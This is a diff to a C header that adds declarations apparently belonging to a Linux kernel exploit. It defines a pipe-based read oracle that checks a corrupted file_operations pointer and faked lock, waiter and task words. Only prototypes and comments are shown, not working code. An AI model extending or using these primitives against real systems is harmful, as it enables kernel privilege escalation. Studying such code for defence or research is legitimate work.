@@ -476,6 +476,35 @@ int prepare_p0_pipe_oracle(void);
 int expand_p0_pipe_oracle(void);
 int verify_p0_pipe_oracle_gate(void);
 int verify_p0_pipe_data_page(uintptr_t target, uint64_t expected);
+/* Single-pass multi-word probe (pipes are destructive-read: one loop must
+ * check the fops pair AND all bank words so postwrite semantics survive).
+ * Pair 0 is the fops pair; the return value follows the verify_p0_pipe_data_page
+ * rule computed on pair 0 only. Bank pairs are diagnostics. */
+struct p0_probe_pair {
+  uintptr_t target;
+  uint64_t expected;
+  const char *label;
+  int exact;
+  uint64_t observed;
+  long nearest;
+};
+int verify_p0_probe_pairs(struct p0_probe_pair *pairs, size_t n);
+/* Production-touch orchestrator: builds the fops pair + legacy production
+ * geometry words (lock@LOCK_OFF, waiter@W0_OFF, task@FAKE_TASK_OFF, fops
+ * table anchors; expected values from the skb mirror) and runs one combined
+ * probe. Returns the fops-pair verdict (same contract as
+ * verify_p0_pipe_data_page). prod_touched_out: 1 if any production word
+ * differs on a page proven to map it (nonzero-word exact match on the same
+ * 4K page), 0 if all probed nonzero words match, -1 if inconclusive
+ * (production page not found in any pipe, or stash not production slot 0). */
+int probe_fops_and_production_touch(
+    uintptr_t fops_target, uint64_t fops_expected, int *prod_touched_out);
+int slide_bank_mirror_word(uintptr_t va, uint64_t *out);
+/* Last-fired route stash (slide_app.c, parent address space). */
+extern size_t fired_route_slot;
+extern uintptr_t fired_route_parent;
+extern uintptr_t fired_route_target;
+extern uintptr_t fired_route_lock;
 uintptr_t scan_p0_pipe_oracle(void);
 #if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
 uint64_t scan_p0_virtual_base_pointer(void);
